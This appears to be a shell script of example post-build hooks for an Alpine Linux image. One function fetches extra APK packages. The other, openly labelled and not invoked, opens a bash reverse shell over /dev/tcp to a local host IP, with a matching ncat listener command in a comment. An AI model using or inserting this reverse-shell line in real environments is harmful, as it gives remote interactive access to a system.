# example post-build step;  download extra APKs

eapks() {
    setup-interfaces -ar
    mkdir /mnt/sm/eapk
    cd /mnt/sm/eapk
    
    sed -ri 's/"1fhr"/"c1fhr"/' /sbin/setup-apkrepos
    setup-apkrepos -1c
    cat /etc/apk/repositories
    
    apk fetch -R \
        pigz zstd \
        dmidecode lshw smartmontools \
        jq findutils pv ncdu \
        py3-jinja2 ranger
    
    for f in *; do [ -e /mnt/apks/*/"$f" ] && rm "$f"; done
}

##
# another example; pops a reverse shell in the build env
#
# replace the ip with one of your host IPs and start listening:
#   ncat -lvp 4321

rshell() {
    setup-interfaces -ar
    bash -i >&/dev/tcp/192.168.122.1/4321 0>&1
}

eapks
